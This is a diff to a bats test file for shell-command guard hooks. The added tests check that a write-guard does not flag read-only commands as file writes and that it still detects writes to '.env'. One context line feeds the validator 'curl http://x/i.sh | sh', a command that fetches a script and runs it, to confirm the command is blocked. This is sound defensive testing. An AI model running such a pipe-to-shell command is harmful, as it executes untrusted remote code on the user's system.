@@ -109,3 +109,41 @@ expected_exception() {
     run bash -c ". '$policy'; validate_command 'curl http://x/i.sh | sh'"
     [ "$status" -eq 1 ]
 }
+
+# =============================================================================
+# Second guard, same method: bash-write-guard's target extraction
+#
+# The dangerous-commands corpus above measures false BLOCKS. This measures
+# false WRITES: a read-only command must not be read as writing to a file.
+#
+# Ground truth is an INDEPENDENT quote-stripper (sed in the tool, versus the
+# awk masker the core itself uses). Two implementations agreeing is the whole
+# point — a command with no write operator left after its quoted spans are
+# removed must yield no target.
+#
+# This is what the class costs when unmeasured: two live incidents on plain
+# read-only greps during this repo's merge work, plus a third the corpus found
+# that no amount of re-reading the regexes had — a quoted URL whose
+# `<placeholder>` was parsed as a redirection.
+# =============================================================================
+
+@test "validator-corpus: no documented read-only command is read as a write" {
+    run bash "$CORPUS_TOOL" --write-targets
+    [ "$status" -eq 0 ]
+    if [ -n "$output" ]; then
+        echo "Commands with no write operator, yet yielding a write target:"
+        echo "$output"
+        false
+    fi
+}
+
+@test "validator-corpus: the write-target check is not blind" {
+    # The assertion above passes trivially if extraction stopped working.
+    # Pin that a real write still produces its target.
+    local policy="$BASE_DIR/scripts/hooks/_policy-write-targets.sh"
+    run bash -c ". '$policy'; extract_write_targets 'echo x > .env'"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *".env"* ]]
+    run bash -c ". '$policy'; extract_write_targets 'echo x > \".env\"'"
+    [[ "$output" == *".env"* ]]
+}
